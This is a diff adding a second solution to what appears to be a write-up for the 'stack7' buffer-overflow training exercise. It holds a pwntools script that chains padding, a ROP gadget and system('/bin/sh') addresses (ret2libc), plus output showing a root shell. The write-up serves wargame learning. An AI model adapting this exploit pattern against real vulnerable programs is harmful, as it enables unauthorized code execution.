@@ -142,3 +142,30 @@ $ whoami
 root
 $  
 ```
+
+* Solution2
+
+```
+from pwn import *
+
+system     = p32(0xf7e0f7e0)
+dummy      = p32(0xFFFFFFFF)
+binsh_addr = p32(0xf7f4e968)
+rop_gadget = p32(0x8048362)
+offset     = 80
+
+payload = "A" * offset + rop_gadget + system + dummy + binsh_addr
+
+p = process(['./stack7'])
+
+p.sendline(payload)
+
+p.interactive()
+root@kali:~/Desktop/bin# python stack7_ex2.py 
+[+] Starting local process './stack7': pid 4594
+[*] Switching to interactive mode
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\x83\x0AAAAAAAAAAAAb\x83\x0�������\xffh���
+$ whoami
+root
+$  
+```
